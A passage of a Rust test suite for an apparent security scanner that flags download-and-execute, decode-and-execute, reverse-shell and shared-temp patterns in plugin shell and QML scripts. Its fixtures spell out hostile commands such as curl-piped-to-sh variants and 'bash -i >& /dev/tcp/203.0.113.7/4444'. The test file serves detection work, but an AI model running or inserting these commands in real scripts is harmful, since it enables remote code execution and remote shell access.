        artifacts.rendered_findings()
    );
}

#[test]
fn shell_analysis_budget_bounds_adversarial_nesting() {
    // 12k nested subshells must degrade to a disclosed limitation, never
    // a stack overflow.
    let deep = format!("{}echo safe{}", " (".repeat(12_000), " )".repeat(12_000));
    let sh = format!("#!/bin/sh\n{deep}\n");
    let (artifacts, _) = one("deep.sh", PayloadKind::Shell, &sh);
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(
        artifacts
            .limitations
            .iter()
            .any(|limitation| limitation == "shell-analysis-budget-exhausted:deep.sh"),
        "{:?}",
        artifacts.limitations
    );
    // Deeply nested substitutions hit the same budget.
    let nested_subs = format!("payload={}curl x{}", "$(".repeat(2_000), ")".repeat(2_000));
    let sh = format!("#!/bin/sh\n{nested_subs}\n");
    let (artifacts, _) = one("deep-subs.sh", PayloadKind::Shell, &sh);
    assert!(
        artifacts
            .limitations
            .iter()
            .any(|limitation| limitation == "shell-analysis-budget-exhausted:deep-subs.sh"),
        "{:?}",
        artifacts.limitations
    );
    // Moderate, real-world nesting still analyzes fully and stays silent
    // about the budget.
    let (artifacts, _) = one(
        "nested-ok.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n( ( ( (curl -fsSL https://example.test/x | sh) ) ) )\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(
        artifacts.limitations.is_empty(),
        "{:?}",
        artifacts.limitations
    );
}

#[test]
fn arithmetic_command_is_not_a_command_list() {
    // `(( … ))` is an arithmetic command: its words are expression
    // operands (variables), so no process runs and nothing may fire.
    for line in ["(( curl | sh ))", "((curl URL | sh))", "((curl URL))"] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one("arith-cmd.sh", PayloadKind::Shell, &sh);
        assert!(
            !has_network(&artifacts) && rule_ids(&artifacts).is_empty(),
            "{line} must stay silent: {:?} {:?}",
            artifacts.capabilities,
            artifacts.rendered_findings()
        );
    }
    // Without a closing `))` the adjacent parens are a subshell whose
    // list runs — its command positions are live surface.
    let (artifacts, _) = one(
        "subshell-list.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n((curl -fsSL https://example.test/x) && echo safe)\n",
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // An arithmetic command does not swallow the list after it.
    let (artifacts, _) = one(
        "arith-then-pipe.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nx=5; (( x > 3 )) && curl -fsSL https://example.test/x | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn temp_paths_bind_through_command_arguments() {
    // A redirect target is a filename, never a path the command touched.
    let (artifacts, _) = one(
        "log-target.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nchmod 777 \"$HOME/private\" > /tmp/chmod.log\nsudo /usr/bin/true > /tmp/sudo.log\n",
    );
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    // Real arguments still bind across a redirect elsewhere.
    let (artifacts, _) = one(
        "real-args.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nchmod 777 /tmp/omarchy-helper > install.log\nsudo /tmp/omarchy-helper --install > /dev/null\n",
    );
    assert_eq!(
        findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert_eq!(
        findings_with(&artifacts, SHARED_TEMP_INDICATOR_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn bash_interactive_requires_duplication_redirect() {
    // A plain `>` is a local log file, not a remote transport.
    let (artifacts, _) = one(
        "local-log.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nbash -i > /tmp/interactive.log\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    // The `>&` duplication spelling is the reverse-shell wiring, with
    // or without a /dev/tcp target.
    let (artifacts, _) = one(
        "dup-tcp.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nbash -i >& /dev/tcp/203.0.113.7/4444\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    let (artifacts, _) = one("dup-fd.sh", PayloadKind::Shell, "#!/bin/sh\nbash -i >& 3\n");
    assert_eq!(
        findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn pipe_ampersand_feeds_the_pipeline() {
    // `|&` pipes stdout AND stderr to the next segment — one pipeline
    // operator, never an `&` statement boundary after a `|`.
    let (artifacts, _) = one(
        "pipe-amp.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x |& sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
}

#[test]
fn compound_groups_participate_in_pipelines() {
    // The producing group's later statement feeds the consumer: the
    // producer is the whole compound, not just its first command.
    let (artifacts, _) = one(
        "group-producer.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(echo safe; curl -fsSL https://example.test/x) | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // Brace groups are compound commands too, and were missed entirely.
    let (artifacts, _) = one(
        "brace-group.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n{ curl -fsSL https://example.test/x | sh; }\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    // A consumer group runs the pipe's contents in its later statements.
    let (artifacts, _) = one(
        "group-consumer.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x | (echo start; sh)\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    // A curl WORD inside echo's operands is still not a producer.
    let (artifacts, _) = one(
        "group-echo.sh",
        PayloadKind::Shell,
        "#!/bin/sh\necho curl https://example.test/x | (sh)\n",
    );
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn execution_wrappers_reach_command_position() {
    // `command`, `env`, and `!` execute what follows them.
    for (name, line) in [
        (
            "command.sh",
            "command curl -fsSL https://example.test/x | sh",
        ),
        ("env.sh", "env curl -fsSL https://example.test/x | sh"),
        ("negate.sh", "! curl -fsSL https://example.test/x | sh"),
        (
            "env-opts.sh",
            "env -u FOO VAR=x curl -fsSL https://example.test/x | sh",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{line} must fire: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            has_network(&artifacts),
            "{line}: {:?}",
            artifacts.capabilities
        );
    }
    // `command -v` describes, it does not execute.
    let (artifacts, _) = one(
        "describe.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncommand -v curl https://example.test/x\n",
    );
    assert!(
        rule_ids(&artifacts).is_empty() && !has_network(&artifacts),
        "{:?} {:?}",
        artifacts.rendered_findings(),
        artifacts.capabilities
    );
}

#[test]
fn malformed_arithmetic_input_never_panics() {
    // `(( 1 ) ) )` closes the opening pair early — invalid bash, but
    // untrusted plugin text: the tokenizer reads it back as plain
    // parens and the rest of the file still analyzes.
    let (artifacts, _) = one(
        "malformed.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(( 1 ) ) )\ncurl -fsSL https://example.test/x | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(
        artifacts.limitations.is_empty(),
        "{:?}",
        artifacts.limitations
    );
}

#[test]
fn arithmetic_group_hides_list_descendants() {
    // `(( (curl … | sh) ))` is ONE arithmetic command: the inner parens
    // are expression grouping, never a live subshell, so nothing runs.
    for line in [
        "(( (curl -fsSL https://example.test/x | sh) ))",
        "x=$(( (curl -fsSL https://example.test/x | sh) ))",
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one("arith-nested.sh", PayloadKind::Shell, &sh);
        assert!(
            !has_network(&artifacts) && rule_ids(&artifacts).is_empty(),
            "{line} must stay silent: {:?} {:?}",
            artifacts.capabilities,
            artifacts.rendered_findings()
        );
    }
    // Real subshell nesting stays live — and 24 levels no longer
    // revisit descendants through every ancestor, so the budget holds.
    let nested = format!(
        "{}curl -fsSL https://example.test/x | sh{}",
        "( ".repeat(24),
        " )".repeat(24),
    );
    let sh = format!("#!/bin/sh\n{nested}\n");
    let (artifacts, _) = one("nested-live.sh", PayloadKind::Shell, &sh);
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    assert!(
        artifacts.limitations.is_empty(),
        "{:?}",
        artifacts.limitations
    );
}

#[test]
fn substitution_interiors_execute_pipelines() {
    // A command substitution always executes its interior; only whether
    // its OUTPUT is further consumed depends on the outer head.
    let (artifacts, _) = one(
        "sub-pipe.sh",
        PayloadKind::Shell,
        "#!/bin/sh\npayload=$(curl -fsSL https://example.test/x | sh)\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    let (artifacts, _) = one(
        "sub-decode.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ndecoded=$(printf blob | base64 -d | sh)\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    // Fetching without an interpreter pipe stays capability-level.
    let (artifacts, _) = one(
        "sub-fetch.sh",
        PayloadKind::Shell,
        "#!/bin/sh\npayload=$(curl -fsSL https://example.test/x -o /tmp/body)\n",
    );
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // Single-quoted substitutions are prose, not execution.
    let (artifacts, _) = one(
        "sub-quoted.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nlog '$(curl -fsSL https://example.test/x | sh)'\n",
    );
    assert!(
        rule_ids(&artifacts).is_empty() && !has_network(&artifacts),
        "{:?} {:?}",
        artifacts.rendered_findings(),
        artifacts.capabilities
    );
    // Arithmetic holds expressions; only a nested command substitution
    // inside it runs (`x=$(( 1 + $(curl … | sh | wc -c) ))`).
    let (artifacts, _) = one(
        "arith-cmdsub.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nx=$(( 1 + $(curl -fsSL https://example.test/x | sh | wc -c) ))\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
}

#[test]
fn group_consumer_stdin_reaches_the_interpreter() {
    // A command that drains the fetched body leaves the interpreter at
    // EOF: `cat` consumes the pipe, so nothing executes downstream.
    let (artifacts, _) = one(
        "drain.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x | (cat >/dev/null; sh)\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // The body still reaches the interpreter when no earlier statement
    // consumes it, when it is forwarded along the inner pipe, and when
    // the draining command's stdin comes from elsewhere.
    for (name, line) in [
        (
            "pass.sh",
            "curl -fsSL https://example.test/x | (echo start; sh)",
        ),
        ("fwd.sh", "curl -fsSL https://example.test/x | (cat | sh)"),
        (
            "own-stdin.sh",
            "curl -fsSL https://example.test/x | (cat </dev/null; sh)",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{line} must fire: {:?}",
            artifacts.rendered_findings()
        );
    }
    // The compound's own stdin redirection starves it too.
    let (artifacts, _) = one(
        "stdin-null.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x | (sh) < /dev/null\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn compound_producer_redirects_scope_to_their_command() {
    // An inner command's log redirect sends only ITS output to the log;
    // the compound's final command still feeds the pipe.
    let (artifacts, _) = one(
        "inner-log.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(echo safe >/tmp/omarchy-setup.log; curl -fsSL https://example.test/x) | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // The FINAL command's own redirect does starve the pipe, at either
    // nesting position.
    for (name, line) in [
        (
            "final-body.sh",
            "(curl -fsSL https://example.test/x >/tmp/body) | sh",
        ),
        (
            "compound-body.sh",
            "(curl -fsSL https://example.test/x) > /tmp/body | sh",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
    }
}

#[test]
fn exec_time_and_env_split_string_execute_their_command() {
    // `exec`, `time`, and `env -S` all execute what they carry.
    for (name, line) in [
        ("exec.sh", "exec curl -fsSL https://example.test/x | sh"),
        ("time.sh", "time curl -fsSL https://example.test/x | sh"),
        (
            "exec-a.sh",
            "exec -a name curl -fsSL https://example.test/x | sh",
        ),
        (
            "time-p.sh",
            "time -p curl -fsSL https://example.test/x | sh",
        ),
        (
            "env-s.sh",
            "env -S 'curl -fsSL https://example.test/x' | sh",
        ),
        (
            "env-split.sh",
            "env --split-string='curl -fsSL https://example.test/x' | sh",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{line} must fire: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            has_network(&artifacts),
            "{line}: {:?}",
            artifacts.capabilities
        );
    }
}

#[test]
fn qml_c_body_budget_exhaustion_is_disclosed() {
    // A `-c` body nested beyond the analysis budget discloses the
    // shortfall instead of silently skipping unverified depth.
    let deep_body = format!(
        "{}curl -fsSL https://example.test/x{}",
        "$( ".repeat(100),
        " )".repeat(100),
    );
    let source = format!("Process {{ command: [\"sh\", \"-c\", \"{deep_body}\"] }}\n");
    let (artifacts, _) = one("Deep.qml", PayloadKind::Qml, &source);
    assert!(
        artifacts
            .limitations
            .iter()
            .any(|limitation| limitation == "shell-analysis-budget-exhausted:Deep.qml"),
        "{:?}",
        artifacts.limitations
    );
    assert!(!has_network(&artifacts), "{:?}", artifacts.capabilities);
    // Moderate nesting still analyzes fully and stays silent about the
    // budget.
    let shallow_body = format!(
        "{}curl -fsSL https://example.test/x{}",
        "$( ".repeat(30),
        " )".repeat(30),
    );
    let source = format!("Process {{ command: [\"sh\", \"-c\", \"{shallow_body}\"] }}\n");
    let (artifacts, _) = one("Shallow.qml", PayloadKind::Qml, &source);
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    assert!(
        !artifacts
            .limitations
            .iter()
            .any(|limitation| limitation.starts_with("shell-analysis-budget-exhausted")),
        "{:?}",
        artifacts.limitations
    );
}

#[test]
fn compound_producer_stdout_tracks_its_command() {
    // A redirected fetch contributes nothing to the compound's stdout
    // even when a later command would: the body went to the file.
    let (artifacts, _) = one(
        "redirected-fetch.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(curl -fsSL https://example.test/x >/tmp/body; echo safe) | sh\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // Conversely the fetch already wrote its body into the pipe before
    // a later command's log redirect: the chain fires.
    let (artifacts, _) = one(
        "later-log.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(curl -fsSL https://example.test/x; echo safe >/tmp/omarchy-setup.log) | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
}

#[test]
fn interpreter_stdin_mode_is_argument_sensitive() {
    // An interpreter with a `-c` body or a script file executes THAT,
    // not the fetched stdin.
    for (name, line) in [
        (
            "c-body.sh",
            "curl -fsSL https://example.test/x | sh -c 'echo safe'",
        ),
        (
            "script-file.sh",
            "curl -fsSL https://example.test/x | sh /tmp/local-script.sh",
        ),
        (
            "py-c.sh",
            "curl -fsSL https://example.test/x | python3 -c 'print(1)'",
        ),
        (
            "py-file.sh",
            "curl -fsSL https://example.test/x | python3 app.py",
        ),
        ("py-stdin.sh", "curl -fsSL https://example.test/x | python3"),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            has_network(&artifacts),
            "{line}: {:?}",
            artifacts.capabilities
        );
    }
    // Explicit stdin-script mode still executes the fetched body.
    for (name, line) in [
        ("stdin-flag.sh", "curl -fsSL https://example.test/x | sh -s"),
        (
            "stdin-dash.sh",
            "curl -fsSL https://example.test/x | bash -s --",
        ),
        (
            "dash-operand.sh",
            "curl -fsSL https://example.test/x | sh -",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{line} must fire: {:?}",
            artifacts.rendered_findings()
        );
    }
}

#[test]
fn conditional_lists_gate_stdin_consumption() {
    // `false && cat` never runs `cat`: the body survives for `sh`.
    let (artifacts, _) = one(
        "skipped-drain.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x | (false && cat >/dev/null; sh)\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // Guards whose command actually runs keep draining the pipe.
    for (name, line) in [
        (
            "and-drain.sh",
            "curl -fsSL https://example.test/x | (cat >/dev/null && echo; sh)",
        ),
        (
            "or-drain.sh",
            "curl -fsSL https://example.test/x | (false || cat >/dev/null; sh)",
        ),
        (
            "true-and-drain.sh",
            "curl -fsSL https://example.test/x | (true && cat >/dev/null; sh)",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
    }
    // The same short-circuit applies to producers: `false && curl` runs
    // no fetch at all.
    let (artifacts, _) = one(
        "skipped-producer.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(false && curl -fsSL https://example.test/x) | sh\n",
    );
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn arithmetic_command_groups_analyze_nested_substitutions() {
    // `(( $(curl URL | sh) + 1 ))` executes the nested pipeline during
    // evaluation, exactly like the `$(( ))` expansion form.
    let (artifacts, _) = one(
        "arith-group-sub.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(( $(curl -fsSL https://example.test/x | sh) + 1 ))\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // Expression words without substitutions still run nothing.
    let (artifacts, _) = one(
        "arith-group-plain.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(( $(echo hi) ))\n",
    );
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn time_valued_short_options_reach_the_wrapped_command() {
    for (name, line) in [
        (
            "time-f.sh",
            "/usr/bin/time -f '%e' curl -fsSL https://example.test/x | sh",
        ),
        (
            "time-o.sh",
            "time -o /tmp/time.log curl -fsSL https://example.test/x | sh",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{line} must fire: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            has_network(&artifacts),
            "{line}: {:?}",
            artifacts.capabilities
        );
    }
}

#[test]
fn deep_arithmetic_nesting_stays_within_the_depth_budget() {
    // 40 nested arithmetic expansions each charge ONE depth level, so a
    // valid expression ending in a command substitution analyzes fully
    // instead of exhausting the nominal depth-64 budget.
    let expression = format!(
        "{}$(curl -fsSL https://example.test/x | sh | wc -c){}",
        "$(( ".repeat(40),
        " ))".repeat(40),
    );
    let sh = format!("#!/bin/sh\nx={expression}\n");
    let (artifacts, _) = one("deep-arith.sh", PayloadKind::Shell, &sh);
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    assert!(
        artifacts.limitations.is_empty(),
        "{:?}",
        artifacts.limitations
    );
}

#[test]
fn compound_producer_survives_its_inner_pipeline() {
    // `cat >/dev/null` consumes the fetch inside the compound's own
    // pipeline, so nothing reaches the compound's stdout for `sh`.
    let (artifacts, _) = one(
        "inner-drain.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(curl -fsSL https://example.test/x | cat >/dev/null) | sh\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // A forwarding intermediate keeps the body flowing through the same
    // nested pipeline.
    let (artifacts, _) = one(
        "inner-forward.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n(curl -fsSL https://example.test/x | cat) | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    // Executed spans draw the same boundary: eval collects only what
    // the substitution's pipeline leaves on its stdout.
    let (artifacts, _) = one(
        "span-drain.sh",
        PayloadKind::Shell,
        "#!/bin/sh\neval \"$(curl -fsSL https://example.test/x | cat >/dev/null)\"\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    let (artifacts, _) = one(
        "span-forward.sh",
        PayloadKind::Shell,
        "#!/bin/sh\neval \"$(curl -fsSL https://example.test/x | cat)\"\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn plain_intermediates_forward_only_known_filters() {
    // Non-reading intermediates leave the pipe untouched, so the shell
    // receives only their own output — never the fetched body.
    for (name, line) in [
        (
            "echo-stage.sh",
            "curl -fsSL https://example.test/x | echo safe | sh",
        ),
        (
            "true-stage.sh",
            "curl -fsSL https://example.test/x | true | sh",
        ),
        (
            "wc-stage.sh",
            "curl -fsSL https://example.test/x | wc -c | sh",
        ),
        (
            "xargs-stage.sh",
            "curl -fsSL https://example.test/x | xargs true | sh",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            has_network(&artifacts),
            "{line}: {:?}",
            artifacts.capabilities
        );
    }
    // Known stdin transformers keep the body flowing.
    for (name, line) in [
        (
            "gzip-stage.sh",
            "curl -fsSL https://example.test/x | gzip -d | sh",
        ),
        (
            "sed-stage.sh",
            "curl -fsSL https://example.test/x | sed 's/a/b/' | sh",
        ),
        (
            "tee-stage.sh",
            "curl -fsSL https://example.test/x | tee /tmp/log | sh",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{line} must fire: {:?}",
            artifacts.rendered_findings()
        );
    }
}

#[test]
fn conditional_outcomes_merge_executed_and_skipped_paths() {
    // `printf ok` succeeds on the live path, so the `&&`-guarded fetch
    // runs even though the `|| false` path skips it.
    let (artifacts, _) = one(
        "merged-paths.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nprintf ok || false && curl -fsSL https://example.test/x | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // Without a success path the chain stays short-circuited: the fetch
    // records neither egress nor a finding.
    let (artifacts, _) = one(
        "failed-chain.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nfalse && printf ok && curl -fsSL https://example.test/x | sh\n",
    );
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(!has_network(&artifacts), "{:?}", artifacts.capabilities);
}

#[test]
fn pipeline_negation_inverts_known_outcomes() {
    // `! true` FAILS, so the `||`-guarded fetch executes.
    let (artifacts, _) = one(
        "negated-guard.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n! true || curl -fsSL https://example.test/x | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // The inverted outcome also short-circuits the other guard.
    let (artifacts, _) = one(
        "negated-chain.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n! true && curl -fsSL https://example.test/x | sh\n",
    );
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(!has_network(&artifacts), "{:?}", artifacts.capabilities);
    // And `! false` succeeds into its `&&`.
    let (artifacts, _) = one(
        "negated-false.sh",
        PayloadKind::Shell,
        "#!/bin/sh\n! false && curl -fsSL https://example.test/x | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
}

#[test]
fn egress_stays_inside_executed_branches() {
    // A short-circuited branch records no NetworkAccess capability and
    // no finding — the fetch never runs, inside or outside a group.
    for (name, line) in [
        (
            "skipped-fetch.sh",
            "(false && curl -fsSL https://example.test/x)",
        ),
        (
            "skipped-substitution.sh",
            "(false && x=$(curl -fsSL https://example.test/x))",
        ),
        (
            "skipped-interior.sh",
            "(true; false && curl -fsSL https://example.test/x)",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            !has_network(&artifacts),
            "{line}: {:?}",
            artifacts.capabilities
        );
    }
    // The same shapes fetch on their executable paths.
